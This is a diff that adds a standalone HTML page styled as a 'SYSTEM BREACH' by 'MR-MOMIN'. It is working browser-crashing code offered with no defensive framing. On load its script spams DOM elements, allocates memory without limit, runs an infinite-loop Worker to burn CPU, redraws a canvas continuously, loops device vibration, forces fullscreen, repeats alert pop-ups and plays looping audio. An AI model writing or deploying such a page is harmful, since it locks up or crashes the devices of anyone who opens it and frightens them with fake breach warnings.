@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>⚠️ SYSTEM BREACH: MR-MOMIN</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: #0f0;
+      font-family: monospace;
+      overflow: hidden;
+    }
+    .warning {
+      position: absolute;
+      font-size: 20px;
+      color: red;
+      animation: shake 0.1s infinite;
+    }
+    @keyframes shake {
+      0% { transform: translate(0px, 0px); }
+      25% { transform: translate(5px, -5px); }
+      50% { transform: translate(-5px, 5px); }
+      75% { transform: translate(5px, 5px); }
+      100% { transform: translate(-5px, -5px); }
+    }
+  </style>
+</head>
+<body>
+
+<audio autoplay loop>
+  <source src="https://www.soundjay.com/button/beep-10.mp3" type="audio/mpeg">
+</audio>
+
+<canvas id="crashCanvas"></canvas>
+
+<script>
+  // Infinite spam
+  setInterval(() => {
+    const div = document.createElement('div');
+    div.className = "warning";
+    div.innerText = "⚠️ SYSTEM OVERLOAD BY MR-MOMIN ⚠️";
+    div.style.top = Math.random() * window.innerHeight + "px";
+    div.style.left = Math.random() * window.innerWidth + "px";
+    document.body.appendChild(div);
+  }, 5);
+
+  // RAM killer
+  let arr = [];
+  setInterval(() => {
+    for (let i = 0; i < 500; i++) {
+      arr.push(new Array(10000).fill("MR-MOMIN"));
+    }
+  }, 100);
+
+  // CPU burn via Worker
+  if (window.Worker) {
+    const blob = new Blob(["while(true){}"], { type: "application/javascript" });
+    const worker = new Worker(URL.createObjectURL(blob));
+  }
+
+  // Vibration loop (mobile only)
+  if (navigator.vibrate) {
+    setInterval(() => {
+      navigator.vibrate([100, 200, 300]);
+    }, 500);
+  }
+
+  // GPU overload via Canvas
+  const canvas = document.getElementById("crashCanvas");
+  const ctx = canvas.getContext("2d");
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  function draw() {
+    for (let i = 0; i < 200; i++) {
+      ctx.fillStyle = `rgb(${Math.random()*255},0,0)`;
+      ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 100, 100);
+    }
+    requestAnimationFrame(draw);
+  }
+  draw();
+
+  // Fullscreen hijack
+  document.documentElement.requestFullscreen().catch(() => {});
+
+  // Browser alert loop
+  setInterval(() => {
+    alert("⚠️ CRITICAL ERROR: CONTROL TAKEN BY MR-MOMIN");
+  }, 15000);
+</script>
+
+</body>
+</html>
